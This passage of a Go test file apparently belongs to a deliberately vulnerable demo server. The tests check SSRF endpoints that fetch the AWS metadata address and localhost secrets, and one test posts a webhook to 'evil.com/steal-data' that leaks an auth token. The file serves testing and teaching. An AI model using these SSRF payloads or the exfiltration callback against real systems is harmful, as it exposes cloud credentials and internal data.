		t.Errorf("Content-Type = %q, want text/plain", ct)
	}
	body := rec.Body.String()
	if !strings.Contains(body, "HTTP/1.1") {
		t.Error("/logs/access.log should return access log content")
	}
}

// ---------------------------------------------------------------------------
// A10: Server-Side Request Forgery (SSRF)
// ---------------------------------------------------------------------------

func TestA10_Fetch_DefaultURL(t *testing.T) {
	h := NewHandler()
	rec := doGet(t, h, "/vuln/a10/fetch")
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want %d", rec.Code, http.StatusOK)
	}
	ct := rec.Header().Get("Content-Type")
	if !strings.Contains(ct, "application/json") {
		t.Errorf("Content-Type = %q, want application/json", ct)
	}
	body := rec.Body.String()
	if !strings.Contains(body, "internal-api.corp") {
		t.Error("default fetch URL should target internal-api.corp")
	}
	if !strings.Contains(body, "request_headers_sent") {
		t.Error("response should expose internal request headers")
	}
}

func TestA10_Fetch_AWSMetadata(t *testing.T) {
	h := NewHandler()
	rec := doGet(t, h, "/vuln/a10/fetch?url="+url.QueryEscape("http://169.254.169.254/latest/meta-data/"))
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want %d", rec.Code, http.StatusOK)
	}
	body := rec.Body.String()
	if !strings.Contains(body, "169.254.169.254") {
		t.Error("AWS metadata URL should be in the response")
	}
	// The fetched content should contain AWS metadata
	if !strings.Contains(body, "ami-id") || !strings.Contains(body, "AccessKeyId") {
		t.Error("fetched AWS metadata content missing expected fields")
	}
}

func TestA10_Fetch_InternalURL(t *testing.T) {
	h := NewHandler()
	rec := doGet(t, h, "/vuln/a10/fetch?url="+url.QueryEscape("http://localhost:8080/secrets"))
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want %d", rec.Code, http.StatusOK)
	}
	body := rec.Body.String()
	if !strings.Contains(body, "secrets-manager") {
		t.Error("localhost URL should return internal service data")
	}
}

func TestA10_Proxy_AWSMetadata(t *testing.T) {
	h := NewHandler()
	rec := doGet(t, h, "/vuln/a10/proxy?target="+url.QueryEscape("http://169.254.169.254/latest/meta-data/"))
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want %d", rec.Code, http.StatusOK)
	}
	ct := rec.Header().Get("Content-Type")
	if !strings.Contains(ct, "text/plain") {
		t.Errorf("Content-Type = %q, want text/plain", ct)
	}
	body := rec.Body.String()
	if !strings.Contains(body, "ami-id") {
		t.Error("proxy with AWS metadata target should return metadata content")
	}
	if !strings.Contains(body, "SecretAccessKey") {
		t.Error("proxy AWS metadata should contain SecretAccessKey")
	}
}

func TestA10_Proxy_GenericTarget(t *testing.T) {
	h := NewHandler()
	rec := doGet(t, h, "/vuln/a10/proxy?target="+url.QueryEscape("http://example.com"))
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want %d", rec.Code, http.StatusOK)
	}
	body := rec.Body.String()
	if !strings.Contains(body, "Proxied response from") {
		t.Error("generic proxy should include 'Proxied response from' text")
	}
}

func TestA10_Proxy_OverlapPath(t *testing.T) {
	h := NewHandler()
	rec := doGet(t, h, "/proxy")
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want %d", rec.Code, http.StatusOK)
	}
	// /proxy overlap should set X-Glitch-Vuln to A10
	if rec.Header().Get("X-Glitch-Vuln") != "A10" {
		t.Error("/proxy should set X-Glitch-Vuln to A10")
	}
	body := rec.Body.String()
	// Default target is AWS metadata
	if !strings.Contains(body, "ami-id") {
		t.Error("/proxy default should return AWS metadata")
	}
}

func TestA10_Webhook(t *testing.T) {
	h := NewHandler()
	rec := doGet(t, h, "/vuln/a10/webhook?callback="+url.QueryEscape("http://evil.com/steal-data"))
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want %d", rec.Code, http.StatusOK)
	}
	ct := rec.Header().Get("Content-Type")
	if !strings.Contains(ct, "application/json") {
		t.Errorf("Content-Type = %q, want application/json", ct)
	}
	body := rec.Body.String()
	if !strings.Contains(body, "webhook_sent") {
		t.Error("webhook response missing 'webhook_sent' status")
	}
	if !strings.Contains(body, "evil.com") {
		t.Error("webhook response should echo the callback URL")
	}
	if !strings.Contains(body, "auth_token") {
		t.Error("webhook response should expose auth_token in payload")
	}
	if !strings.Contains(body, "unvalidated") {
		t.Error("webhook response should warn about unvalidated URL")
	}
}

func TestA10_Webhook_DefaultCallback(t *testing.T) {
	h := NewHandler()
	rec := doGet(t, h, "/vuln/a10/webhook")
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want %d", rec.Code, http.StatusOK)
	}
	body := rec.Body.String()
	if !strings.Contains(body, "evil.com/steal-data") {
		t.Error("default callback should be evil.com/steal-data")
	}
}

// ---------------------------------------------------------------------------
// Unknown paths and 404 handling
// ---------------------------------------------------------------------------

func TestUnknownVulnSubpath_404(t *testing.T) {
	h := NewHandler()
	rec := doGet(t, h, "/vuln/unknown-path")
	if rec.Code != http.StatusNotFound {
		t.Errorf("status = %d, want %d", rec.Code, http.StatusNotFound)
	}
	body := rec.Body.String()
	if !strings.Contains(body, "Unknown vulnerability demo path") {
		t.Error("404 response missing 'Unknown vulnerability demo path' text")
	}
}

func TestA01_UnknownSubpath_404(t *testing.T) {
	h := NewHandler()
	rec := doGet(t, h, "/vuln/a01/nonexistent")
	if rec.Code != http.StatusNotFound {
		t.Errorf("status = %d, want %d", rec.Code, http.StatusNotFound)
	}
}

// ---------------------------------------------------------------------------
// ServeHTTP return values (status codes)
// ---------------------------------------------------------------------------

func TestServeHTTP_ReturnsCorrectStatusCodes(t *testing.T) {
	h := NewHandler()
	cases := []struct {
		path string
		want int
	}{
		{"/vuln/", http.StatusOK},
		{"/vuln/a01/", http.StatusOK},
		{"/vuln/a01/admin-panel", http.StatusOK},
		{"/vuln/a05/error", http.StatusInternalServerError},
		{"/vuln/unknown-path", http.StatusNotFound},
	}
	for _, tc := range cases {
		req := httptest.NewRequest(http.MethodGet, tc.path, nil)
		rec := httptest.NewRecorder()
		code := h.ServeHTTP(rec, req)
		if code != tc.want {
			t.Errorf("ServeHTTP(%q) returned status %d, want %d", tc.path, code, tc.want)
		}
		if rec.Code != tc.want {
			t.Errorf("ServeHTTP(%q) wrote status %d, want %d", tc.path, rec.Code, tc.want)
		}
	}
}

// ---------------------------------------------------------------------------
// Deterministic output (seeded from path)
// ---------------------------------------------------------------------------

func TestDeterministicOutput_A06Versions(t *testing.T) {
	h := NewHandler()
	body1 := doGet(t, h, "/vuln/a06/versions").Body.String()
	body2 := doGet(t, h, "/vuln/a06/versions").Body.String()
	// The response includes scan_date which uses time.Now(), so check structural parts only.
	// Verify the static components list is identical by checking key components appear.
	for _, comp := range []string{"Log4j", "Apache HTTP Server", "jQuery", "CVE-2021-44228"} {
		if !strings.Contains(body1, comp) || !strings.Contains(body2, comp) {
			t.Errorf("A06 versions missing expected component %q", comp)
		}
	}
	// Both should have the same number of components
	count1 := strings.Count(body1, "\"name\"")
	count2 := strings.Count(body2, "\"name\"")
	if count1 != count2 {
		t.Errorf("A06 versions component counts differ: %d vs %d", count1, count2)
	}
}

func TestDeterministicOutput_A09AuditLog(t *testing.T) {
	h := NewHandler()
	body1 := doGet(t, h, "/vuln/a09/audit").Body.String()
	body2 := doGet(t, h, "/vuln/a09/audit").Body.String()
	// The response includes timestamps from time.Now(), so check structural determinism.
	// The actions and users are seeded from a fixed path, so the set of actions should match.
	// Compare entry count
	count1 := strings.Count(body1, "\"action\"")
	count2 := strings.Count(body2, "\"action\"")
	if count1 != count2 {
		t.Errorf("A09 audit log entry counts differ: %d vs %d", count1, count2)
	}
	if count1 != 100 {
		t.Errorf("A09 audit log should have 100 entries, got %d", count1)
	}
}

// ---------------------------------------------------------------------------
// JSON endpoints return proper Content-Type
// ---------------------------------------------------------------------------

func TestJSONEndpoints_ContentType(t *testing.T) {
	h := NewHandler()
	jsonPaths := []string{
		"/vuln/a01/users/1",
		"/admin/users",
		"/vuln/a02/export",
		"/vuln/a03/users?id=1",
		"/vuln/a04/reset?email=a@b.com",
		"/vuln/a04/verify?token=0001",
		"/vuln/a04/users",
		"/vuln/a05/config",
		"/vuln/a06/versions",
		"/vuln/a08/token",
		"/vuln/a08/deserialize",
		"/vuln/a08/update",
		"/vuln/a09/audit",
		"/vuln/a10/fetch",
		"/vuln/a10/webhook",
	}
	for _, p := range jsonPaths {
		rec := doGet(t, h, p)
		ct := rec.Header().Get("Content-Type")
		if !strings.Contains(ct, "application/json") {
			t.Errorf("path %q: Content-Type = %q, want application/json", p, ct)
		}
	}
}
